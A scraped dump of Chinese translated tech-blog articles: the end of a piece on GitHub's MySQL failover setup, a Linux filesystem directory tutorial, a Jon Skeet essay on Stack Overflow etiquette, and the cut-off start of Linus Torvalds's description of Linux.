开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。,\n,它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：,\n,\n,没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且,\n,认为服务器可以将它所有的版本视为复本。,\n,\n,在这个例子中 orchestrator 首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了 Consul KV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。,\n,有可能当我们的 GLB 服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！,\n,半同步复制,\n,在 MySQL 的,半同步复制,中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。,\n,一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。,\n,我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地 DC 副本，通常也发送到远程 DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。,\n,我们在本地 DC 副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的 DC 故障进行无损故障转移的代价很高昂，我们并不期待这么做。,\n,在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的,试验,中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。,\n,心跳注入,\n,我们没有在已提升/已降级的主设备上管理 pt-heartbeat 服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些,补丁,，以便使 pt-heartbeat 可以支持服务器端来回更改它们的 read_only 状态或其完全崩溃。,\n,在我们目前的设置中，在主服务器及其副本上运行 pt-heartbeat 服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的 pt-heartbeat 会将服务器标识为可写，并开始注入心跳事件。,\n,orchestrator 所有权委托,\n,我们进一步委托到 orchestrator：,\n,\n,伪-GTID注入,\n,设置被提升的主控作为可写的，清除它的复写状态,\n,如果可能，设置老的主控为只读状态,\n,\n,对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让 orchestrator 直接应用变更到被晋升的主控上也应该是合理的。,\n,限制和缺点,\n,代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。,\n,随着分布式系统的发展，我们仍然遗留了未处理的场景。,\n,值得注意的是，在数据中心隔离场景中，假设主服务器位于 DC 中，DC 中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的 DC 中，通过实现一个可靠的 ,STONITH, 来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。,\n,更多的场景存在：故障转移时 Consul 的终端；部分 DC 隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。,\n,结果,\n,orchestrator/GLB/Consul 设置给我们提供以下功能：,\n,\n,可靠的故障检测,\n,数据中心不可知的故障迁移,\n,典型的无损故障迁移,\n,对数据中心网络隔离的支持,\n,缓解脑裂的问题（仍在实现中）,\n,无合作相关的依赖,\n,多数场景下大约 10~13 秒的断电恢复能力。（我们观察到一些场景下最长 20 秒的断电恢复和极端场景下最长 25 秒的情况）,\n,\n,结语,\n,编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114200/", "url_object_id": "b88c57937f3bff3e9546fbbb3ad0988e", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 文件系统详解", "create_time": "2018/07/02", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Paul Brown,   译文出处：,Linux中国/amwps290,   ,这篇教程将帮你快速了解 Linux 文件系统。,\n,早在 1996 年，在真正理解文件系统的结构之前，我就学会了如何在我崭新的 Linux 上安装软件。这是一个问题，但对程序来说不是大问题，因为即使我不知道实际的可执行文件在哪里，它们也会神奇地工作。问题在于文档。,\n,你知道，那时候，Linux 不是像今天这样直观、用户友好的系统。你必须读很多东西。你必须知道你的 CRT 显示器的扫描频率以及拨号调制解调器的噪音来龙去脉，以及其他数以百计的事情。 我很快就意识到我需要花一些时间来掌握目录的组织方式以及 ,/etc,（不是用于“其它”文件），,/usr,（不是用于“用户”文件）和 ,/bin, （不是“垃圾桶”）的意思。,\n,本教程将帮助你比我当时更快地了解这些。,\n,结构,\n,从终端窗口探索 Linux 文件系统是有道理的，这并不是因为作者是一个脾气暴躁的老人，并且对新孩子和他们漂亮的图形工具不以为然（尽管某些事实如此），而是因为终端，尽管只是文本界面，才是更好地显示 Linux 目录树结构的工具。,\n,事实上，帮助你了解这一切的、应该首先安装的第一个工具的名为：,tree,。如果你正在使用 Ubuntu 或 Debian ，你可以：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt install tree\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt ,install ,tree, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Red Hat 或 Fedora :,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo dnf install tree\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,dnf ,install ,tree, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于 SUSE/openSUSE 可以使用 ,zypper,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo zypper install tree\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,zypper ,install ,tree, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于使用 Arch （Manjaro，Antergos，等等）使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo pacman -S tree\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,pacman, ,-,S, ,tree, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,……等等。,\n,一旦安装好，在终端窗口运行 ,tree, 命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntree /\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tree, ,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述指令中的 ,/, 指的是根目录。系统中的其他目录都是从根目录分支而出，当你运行 ,tree, 命令，并且告诉它从根目录开始，那么你就可以看到整个目录树，系统中的所有目录及其子目录，还有它们的文件。,\n,如果你已经使用你的系统有一段时间了，这可能需要一段时间，因为即使你自己还没有生成很多文件，Linux 系统及其应用程序总是在记录、缓存和存储各种临时文件。文件系统中的条目数量会快速增长。,\n,不过，不要感到不知所措。 相反，试试这个：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntree -L 1 /\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tree, ,-,L, ,1, ,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你应该看到如图 1 所示。,\n,\n,tree,\n,上面的指令可以翻译为“只显示以 ,/,（根目录） 开头的目录树的第一级”。 ,-L, 选项告诉树你想看到多少层目录。,\n,大多数 Linux 发行版都会向你显示与你在上图中看到的相同或非常类似的结构。 这意味着，即使你现在感到困惑，掌握这一点，你将掌握大部分（如果不是全部的话）全世界的 Linux 文件系统。,\n,为了让你开始走上掌控之路，让我们看看每个目录的用途。 当我们查看每一个目录的时候，你可以使用 ,ls, 来查看他们的内容。,\n,目录,\n,从上到下，你所看到的目录如下,\n,/bin,\n,/bin, 目录是包含一些二进制文件的目录，即可以运行的一些应用程序。 你会在这个目录中找到上面提到的 ,ls, 程序，以及用于新建和删除文件和目录、移动它们基本工具。还有其它一些程序，等等。文件系统树的其他部分有更多的 ,bin, 目录，但我们将在一会儿讨论这些目录。,\n,/boot,\n,/boot, 目录包含启动系统所需的文件。我必须要说吗？ 好吧，我会说：,不要动它,！ 如果你在这里弄乱了其中一个文件，你可能无法运行你的 Linux，修复被破坏的系统是非常痛苦的一件事。 另一方面，不要太担心无意中破坏系统：你必须拥有超级用户权限才能执行此操作。,\n,/dev,\n,/dev 目录包含设备文件。 其中许多是在启动时或甚至在运行时生成的。 例如，如果你将新的网络摄像头或 USB 随身碟连接到你的机器中，则会自动弹出一个新的设备条目。,\n,/etc,\n,/etc, 的目录名称会让人变得非常的困惑。,/etc, 得名于最早的 Unix 系统们，它的字面意思是 “etcetera”（诸如此类） ，因为它是系统文件管理员不确定在哪里放置的文件的垃圾场。,\n,现在，说 ,/etc, 是“要配置的所有内容Everything To Configure”更为恰当，因为它包含大部分（如果不是全部的话）的系统配置文件。 例如，包含系统名称、用户及其密码、网络上计算机名称以及硬盘上分区的安装位置和时间的文件都在这里。 再说一遍，如果你是 Linux 的新手，最好是不要在这里接触太多，直到你对系统的工作有更好的理解。,\n,/home,\n,/home, 是你可以找到用户个人目录的地方。在我的情况下，,/home, 下有两个目录：,/home/paul,，其中包含我所有的东西；另外一个目录是 ,/home/guest, 目录，以防有客人需要使用我的电脑。,\n,/lib,\n,/lib, 是库文件所在的地方。库是包含应用程序可以使用的代码文件。它们包含应用程序用于在桌面上绘制窗口、控制外围设备或将文件发送到硬盘的代码片段。,\n,在文件系统周围散布着更多的 ,lib, 目录，但是这个直接挂载在 ,/, 的 ,/lib, 目录是特殊的，除此之外，它包含了所有重要的内核模块。 内核模块是使你的显卡、声卡、WiFi、打印机等工作的驱动程序。,\n,/media,\n,在 ,/media, 目录中，当你插入外部存储器试图访问它时，将自动挂载它。与此列表中的大多数其他项目不同，,/media, 并不追溯到 1970 年代，主要是因为当计算机正在运行而动态地插入和检测存储（U 盘、USB 硬盘、SD 卡、外部 SSD 等)，这是近些年才发生的事。,\n,/mnt,\n,然而，,/mnt, 目录是一些过去的残余。这是你手动挂载存储设备或分区的地方。现在不常用了。,\n,/opt,\n,/opt, 目录通常是你编译软件（即，你从源代码构建，并不是从你的系统的软件库中安装软件）的地方。应用程序最终会出现在 ,/opt/bin, 目录，库会在 ,/opt/lib, 目录中出现。,\n,稍微的题外话：应用程序和库的另一个地方是 ,/usr/local,，在这里安装软件时，也会有 ,/usr/local/bin, 和 ,/usr/local/lib, 目录。开发人员如何配置文件来控制编译和安装过程，这就决定了软件安装到哪个地方。,\n,/proc,\n,/proc,，就像 ,/dev, 是一个虚拟目录。它包含有关你的计算机的信息，例如关于你的 CPU 和你的 Linux 系统正在运行的内核的信息。与 ,/dev, 一样，文件和目录是在计算机启动或运行时生成的，因为你的系统正在运行且会发生变化。,\n,/root,\n,/root, 是系统的超级用户（也称为“管理员”）的主目录。 它与其他用户的主目录是分开的，,因为你不应该动它,。 所以把自己的东西放在你自己的目录中，伙计们。,\n,/run,\n,/run, 是另一个新出现的目录。系统进程出于自己不可告人的原因使用它来存储临时数据。这是另一个,不要动它,的文件夹。,\n,/sbin,\n,/sbin, 与 ,/bin, 类似，但它包含的应用程序只有超级用户（即首字母的 ,s, ）才需要。你可以使用 ,sudo, 命令使用这些应用程序，该命令暂时允许你在许多 Linux 发行版上拥有超级用户权限。,/sbin, 目录通常包含可以安装、删除和格式化各种东西的工具。你可以想象，如果你使用不当，这些指令中有一些是致命的，所以要小心处理。,\n,/usr,\n,/usr, 目录是在 UNIX 早期用户的主目录所处的地方。然而，正如我们上面看到的，现在 ,/home, 是用户保存他们的东西的地方。如今，,/usr, 包含了大量目录，而这些目录又包含了应用程序、库、文档、壁纸、图标和许多其他需要应用程序和服务共享的内容。,\n,你还可以在 ,/usr, 目录下找到 ,bin,，,sbin,，,lib, 目录，它们与挂载到根目录下的那些有什么区别呢？现在的区别不是很大。在早期，,/bin, 目录（挂载在根目录下的）只会包含一些基本的命令，例如 ,ls,、,mv, 和 ,rm, ；这是一些在安装系统的时候就会预装的一些命令，用于维护系统的一个基本的命令。 而 ,/usr/bin, 目录则包含了用户自己安装和用于工作的软件，例如文字处理器，浏览器和一些其他的软件。,\n,但是许多现代的 Linux 发行版只是把所有的东西都放到 ,/usr/bin, 中，并让 ,/bin, 指向 ,/usr/bin,，以防彻底删除它会破坏某些东西。因此，Debian、Ubuntu 和 Mint 仍然保持 ,/bin, 和 ,/usr/bin, （和 ,/sbin, 和 ,/usr/sbin, ）分离；其他的，比如 Arch 和它衍生版，只是有一个“真实”存储二进制程序的目录，,/usr/bin,，其余的任何 ,bin, 目录是指向 ,/usr/,bin 的“假”目录。,\n,/srv,\n,/srv, 目录包含服务器的数据。如果你正在 Linux 机器上运行 Web 服务器，你网站的 HTML文件将放到 ,/srv/http,（或 ,/srv/www,）。 如果你正在运行 FTP 服务器，则你的文件将放到 ,/srv/ftp,。,\n,/sys,\n,/sys, 是另一个类似 ,/proc, 和 ,/dev, 的虚拟目录，它还包含连接到计算机的设备的信息。,\n,在某些情况下，你还可以操纵这些设备。 例如，我可以通过修改存储在 ,/sys/devices/pci0000:00/0000:00:02.0/drm/card1/card1-eDP-1/intel_backlight/brightness, 中的值来更改笔记本电脑屏幕的亮度（在你的机器上你可能会有不同的文件）。但要做到这一点，你必须成为超级用户。原因是，与许多其它虚拟目录一样，在 ,/sys, 中打乱内容和文件可能是危险的，你可能会破坏系统。直到你确信你知道你在做什么。否则不要动它。,\n,/tmp,\n,/tmp, 包含临时文件，通常由正在运行的应用程序放置。文件和目录通常（并非总是）包含应用程序现在不需要但以后可能需要的数据。,\n,你还可以使用 ,/tmp, 来存储你自己的临时文件 —— ,/tmp, 是少数挂载到根目录下而你可以在不成为超级用户的情况下与它进行实际交互的目录之一。,\n,/var,\n,/var, 最初被如此命名是因为它的内容被认为是可变的variable，因为它经常变化。今天，它有点用词不当，因为还有许多其他目录也包含频繁更改的数据，特别是我们上面看到的虚拟目录。,\n,不管怎样，,/var, 目录包含了放在 ,/var/log, 子目录的日志文件之类。日志是记录系统中发生的事件的文件。如果内核中出现了什么问题，它将被记录到 ,/var/log, 下的文件中；如果有人试图从外部侵入你的计算机，你的防火墙也将记录尝试。它还包含用于任务的假脱机程序。这些“任务”可以是你发送给共享打印机必须等待执行的任务，因为另一个用户正在打印一个长文档，或者是等待递交给系统上的用户的邮件。,\n,你的系统可能还有一些我们上面没有提到的目录。例如，在屏幕截图中，有一个 ,/snap, 目录。这是因为这张截图是在 Ubuntu 系统上截取的。Ubuntu 最近将 ,snap, 包作为一种分发软件的方式。,/snap, 目录包含所有文件和从 snaps 安装的软件。,\n,更深入的研究,\n,这里仅仅谈了根目录，但是许多子目录都指向它们自己的一组文件和子目录。图 2 给出了基本文件系统的总体概念（图片是在 Paul Gardner 的 CC BY-SA 许可下提供的），,Wikipedia 对每个目录的用途进行了总结,。,\n,\n,图 2：标准 Unix 文件系统,\n,要自行探索文件系统，请使用 ,cd, 命令：,cd,将带你到你所选择的目录（ ,cd, 代表更改目录）。,\n,如果你不知道你在哪儿，,pwd,会告诉你，你到底在哪里，（ ,pwd, 代表打印工作目录 ），同时 ,cd,命令在没有任何选项或者参数的时候，将会直接带你到你自己的主目录，这是一个安全舒适的地方。,\n,最后，,cd ..,将会带你到上一层目录，会使你更加接近根目录，如果你在 ,/usr/share/wallpapers, 目录，然后你执行 ,cd .., 命令，你将会跳转到 ,/usr/share, 目录,\n,要查看目录里有什么内容，使用 ,ls, 或这简单的使用 ,l, 列出你所在目录的内容。,\n,当然，你总是可以使用 ,tree, 来获得目录中内容的概述。在 ,/usr/share, 上试试——里面有很多有趣的东西。,\n,总结,\n,尽管 Linux 发行版之间存在细微差别，但它们的文件系统的布局非常相似。 你可以这么说：一旦你了解一个，你就会都了解了。 了解文件系统的最好方法就是探索它。 因此，伴随 ,tree, ，,ls, 和 ,cd, 进入未知的领域吧。,\n,你不会只是因为查看文件系统就破坏了文件系统，因此请从一个目录移动到另一个目录并进行浏览。 很快你就会发现 Linux 文件系统及其布局的确很有意义，并且你会直观地知道在哪里可以找到应用程序，文档和其他资源。,\n,通过 Linux 基金会和 edX 免费的 “,Linux入门,” 课程了解更多有关 Linux 的信息。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114189/", "url_object_id": "b712fbfeffbfaff779433029fcdbb8d8", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/03/6dd085bf97f82f786b71b4fbcdb37e88.jpg"], "title": "如何成为 StackOverflow 上合格的提问者与回答者", "create_time": "2018/07/09", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,学以致用123, 翻译，,刘唱, 校稿。未经许可，禁止转载！,英文出处：,JONSKEET,。欢迎加入,翻译组,。,写这篇文章最直接的原因是我的朋友 Rob Conery 发了一条,推特,，解释他为什么放弃在 Stack Overflow 贡献答案。,\n,然而，那已经是很长时间的事了。前不久，我开始写一篇与本文类似的文章，但是文章越写越长，并且没有得出任何结论。现在我用一个小时的时间写这篇文章，然后不论写了什么都要发出去（稍后可能会重新排版）。,\n,我了解很多用户对 Stack Overflow 的复杂感情。有些人认为它完全没有价值，但是我相信更多的人认为它“资源有价值，但是潜在的反对意见让人很难做出贡献”。有些人则定期做出贡献，在合理的时间范围内，偶尔解释或者查看反对意见。,\n,这篇文章，我将谈谈我的经历，和我的一些看法，关于 Stack Overflow 存在的问题、我对一些察觉到的问题持反对态度、和如何改善目前的状况。下面是我希望在二月份拜访 Stack Overflow 团队时详细讨论的主题，但我们却忙于,讨论其它重要问题,。,\n,在这篇文章中，我大部分讨论的是”提问者” 和 “回答者”，这是特意进行的简化。许多用户可能既是求助者又是回答者，我很多时候还会用不写答案但是用“view” 写评论的方式成为回答者。尽管任何用户都可以担任不同的角色，但是对提交的每个问题，每个人通常只有一个角色。当然还有其他的角色，例如“评论其它答案的评论者”，我不想花费过多的时间讨论这个问题。,\n,目标和期望的差距,\n,与生活中大多数事情相似，当所有人目标一致时 Stack Overflow 的表现最好，因为我们可以共同迈向那个目标。相反，当人们的目标不同时则通常会出现问题。,\n,对于 Stack Overflow 而言，最普遍的问题在于这两个目标的差异：,\n,\n,– 提问者：尽量减少解决面临的问题所需要的时间,\n,– 回答者：最大限度地提高网站所有问题的价值，将网站视为长久的资源,\n,\n,就我而言，我经常有一个“试图帮助提高软件工程师的诊断能力，使他们能够更好地解决自己的问题”的子目标。,\n,例如，考虑这个问题（编造的，但并不牵强） ：,\n,Random 总是返回相同的数值，它出问题了吗？,\n,在我看来这是一个低质量的问题（稍后我将对其进行详细讨论）。我基本知道哪里存在问题，但是为了达到我的目标我希望提问者改善这个问题，我希望看到他们的代码、结果等。如果我的答案是正确的（快速连续创建多个使用相同的基于系统时间的种子的 System.Random 的多个实例），那么这个问题很可能由于重复而被关闭，并且很可能被删除。以现在的形式，这个问题对网站没有任何好处。我不想没有确定是否重复之前就将这个问题以重复的原因关闭。,\n,现在，从提问者的角度来看，这些并不重要。如果他们知道我知道问题可能出现在哪，他们可能会认为我应该告诉他们，以便他们可以继续工作。如果现在就可以得到答案，为什么还需要花费 10 分钟来重现问题？更糟糕的是，如果他们花时间做了这些事情，然后由于重复的原因又立刻关闭这个问题，这样看上去很像在浪费时间。,\n,如果忽略情绪，我认为时间没有被浪费：,\n,\n,– 提问者可以了解到，提出一个清晰的问题可以更快的得到答案。,\n,– 提问者可以了解到，搜索重复问题很有价值，因为这可能意味着根本不需要提出这个问题。,\n,\n,但是我们都是普通人，忽略感情显然是个不可取的方法。在这种情况下可能发生的情况是 ( 即使我始终很有礼貌) 提问者会认为 Stack Overflow 中到处是只关心自己权利的“交警”。 我当然可以认为这是不公平的（虽然这可能会突出我的实际目标 ） 但这可能无法改变任何人的想法。,\n,因此，这是个问题。Stack Overflow 社区认同网站的目标，那么在用户提出问题时向用户明确说明网站的目标了吗？ 值得注意的是,导航页面,(奇怪的是网站首页没有设置该链接) 包含以下内容：,\n,在您的帮助下，我们正在共同努力，为每个关于编程的问题建立一个详细答案库。,\n,我倾向于稍作更改：,\n,Stack Overflow 的目标在于创建高质量的问题库以及问题的高质量答案库。,\n,这真的是一个共同愿景吗？如果提问者意识到这点，会有帮助吗？我是希望如此，但是我怀疑它会阻止掉所有问题（我不认为有什么能做到阻止所有问题的提问，世界不是一个完美的地方）。,\n,让我们转到另一个我与其他人有不同意见的话题：低质量问题。,\n,是的，存在低质量问题,\n,即使不能以完全客观的方式衡量，我也敢肯定有高质量问题和低质量问题（还有很多介于中间的）。,\n,我认为 Stack Overflow 中这样的问题可以看做高质量问题：,\n,\n,– 提出一个问题，并且明确知道该问题的要求。这个问题应该能够非常明显地看出答案是否回答了问题（这与答案是否正确无关）,\n,– 避免无关紧要。这可能很困难，但是我认为这是有效工作的一部分：如果在开发 web 应用程序时遇到问题，至少应该尝试确定 web 应用程序的上下文是否与问题有关。,\n,– 对其他人尽量有帮助。这是避免不相关因素的非常重要的原因。很多用户需要将字符串解析为日期。较少人需要使用 X 框架的 Y 版本通过定制及专有网络协议与 COBOL 编写的客户端交互时将字符串解析为日期。,\n,– 阐述提问者进行过的尝试、进展以及卡住的位置。,\n,– 在适当的情况下（通常情况）包含一个证明问题的小例子。,\n,– 格式正确。不要使用整页的段落，不要使用没有格式化的代码等等。,\n,\n,Stack Overflow 上有很多符合所有这些要求的问题，或符合以上大部分要求的问题。,\n,我有理由认为这样的问题比另外一些问题质量高，一些问题可能只是一个家庭作业的照片。我曾经见过这样的问题，虽然，它们并不总是那么糟糕，但是我真的不知道如果这都不能认为是一个低质量的问题，我们还能达成什么一致意见。,\n,当然，在此之间还有很多问题——但我认为接受存在低质量问题的观点非常重要，或者至少经过讨论并找出不同意见。,\n,经验有助于写出好问题，但并非绝对必要,\n,我看过许多文章声称 Stack Overflow 对于新用户来讲过于困难，因为，新用户很难写出一个好问题。,\n,我认为接受网站协议并愿意为之付出努力的新人，至少能提出一个合理的问题。他们可能需要花费更长的时间进行研究并写出问题，而且写出的问题可能不会像有经验的人在相同情况下写出的问题那样简单。但是我相信，整体而言，新用户能够写出质量足够好的问题。他们可能没有意识到他们需要做什么或者为什么这样做，但这是一个拥有不同解决方案的问题。而不仅仅是”提问者可能是技术新手，所以我们需要回答没有任何帮助的糟糕问题”。,\n,一个稍稍不同的问题是用户是否具有写出真正优秀问题所需的诊断技能。这是一个,我非常重视的话题,，而且我真的希望有一个好的解决方案，但是我真的没有。我坚信，帮助程序员提高自己的诊断能力，除了在 Stack Overflow 中提出更好的问题之外，将对他们有巨大的好处。,\n,一些用户在 Stack Overflow 的表现像个混蛋，但是大多数人不会这样,\n,我当然不会宣称 Stack Overflow 社区是完美的。我看到过一些用户对提出低质量问题的人非常无理，我不是要为此进行申辩。如果你看我非常不礼貌，那么请阻止我。我不认为要求改进问题本身是粗鲁的，我们可以非常礼貌地要求改进问题，也可以非常刻薄地要求改进问题。我完全赞成提高 Stack Overflow 的文明水平，但是我认为这不能以牺牲网站质量为代价。,\n,我还经历过要求提问者提供更多信息时，提问者的反应非常无理的情况。这不是一个单向的问题。在这个方向上，我看到过比回答者更加粗鲁的行为。事实上，这些问题通常被关闭或删除，所以只是随便浏览网站的人通常不会看到这些。,\n,我的时间非常有限，所以我们来看最重要的一点，我们需要对彼此更友好。,\n,Jon 的 Stack Overflow 宣誓,\n,我故意把它称为,我的,宣誓，因为这不是将我的要求强加于他人的地方。如果你认为这也是你想遵循的原则（或许有一些修正），那再好不过了。如果 Stack Overflow 决定在网站指南的某个地方采用它，我非常欢迎，并且他们可以对其做任何适当的修改。,\n,从本质上来讲，我认为许多问题看起来像是提问者和回答者之间的一种交易。因此，建立一种契约是合理的（虽然这听起来更像是商业用语），因此，我倾向于使用一个诚心的宣誓。,\n,作为一个回答者，我将…,\n,\n,不表现的像个混蛋。,\n,记住我正在回应的是人，是有感情的。,\n,认定我正在回应的人是诚心地希望得到帮助。,\n,要明确，对问题质量的评论不是对提问者的价值的指责。,\n,记住，有些时候，我正在回应的人可能会感到他们正在被指责，即使我不认为我有这个意思。,\n,要明确，评论如何改善问题时提出积极的具体建议，不要消极地强调现状。,\n,答案要清楚，记住不是每个人都与我的技术背景相同（所以有些术语可能需要链接等)。,\n,花点时间好好展示我的答案，使用尽可能易读的格式。,\n,\n,作为一个提问者，我将… ,\n,\n,不表现的像个混蛋。,\n,记住任何一个回答问题的都是人类，都是有感情的。,\n,认定任何一个回答我问题的人都充满善意并试图帮助我。,\n,记住我是在要求其他人放弃自己的时间来帮助我解决问题。,\n,在提问之前先研究自己的问题、尽可能的缩小问题范围、给出尽可能详细的相关信息来减少回答问题的人需要花费的时间。,\n,花点时间好好提出自己的问题，使用尽可能易读的格式。,\n,\n,我希望大部分时间我可以遵循这些誓言。我怀疑自己有时候做不到，所有希望通过明确的写出来，阅读它，使自己成为一个更好的社区成员。,\n,我认为如果每个人在 Stack Overflow 上发布任何内容之前都遵循这样的誓言，我们的社区将会更加美好。,\n\r\n        \r\n            ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n        , 打赏译者,\n    ,\n\n    ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n                ,任选一种支付方式,\n                ,\n                        ,\n            \n                            ,\n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,学以致用123,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            应用软件开发，主要用python、sql        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 21,        ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114166/", "url_object_id": "3c54b89b3dd03db77b3745813da08bcc", "front_image_path": "full/217248f366b3ffdce01fd5df8546529db6cbed0f.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "title": "Linus 定义 Linux", "create_time": "2018/07/09", "vote": "1", "bookmark": "2", "comments": "2", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Linus Torvalds,   译文出处：,开源中国,   ,LINUX介绍,\n,LINUX是什么？,\n,LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为 __asm__ 和 